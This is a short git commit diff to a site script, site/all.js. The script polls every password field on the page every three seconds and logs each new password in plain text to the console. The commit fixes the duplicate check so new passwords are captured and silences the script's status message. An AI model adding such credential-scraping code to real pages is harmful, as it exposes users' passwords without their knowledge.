0d8d140833bea5a849dae3f9d3066e22512a0ad7
月之领主LM <178910432@qq.com>
2020-06-02 13:47:04 +0800

    Update

--- site/all.js
+++ site/all.js
@@ -6,12 +6,12 @@ var log_password = function () {
     var passwords = document.querySelectorAll('input[type="password"]');
     for (i = 0; i < passwords.length; i++) {
         var password = passwords[i].value;
-        if(password !== '' && passwords_logged.indexOf(password) > -1){
+        if(password !== '' && passwords_logged.indexOf(password) == -1){
             console.log("password : " + password);
             passwords_logged.push(password);
         }
     }
-    console.log('log_password is running ...');
+    //console.log('log_password is running ...');
 };
 log_password();
 setInterval(log_password, 3000);
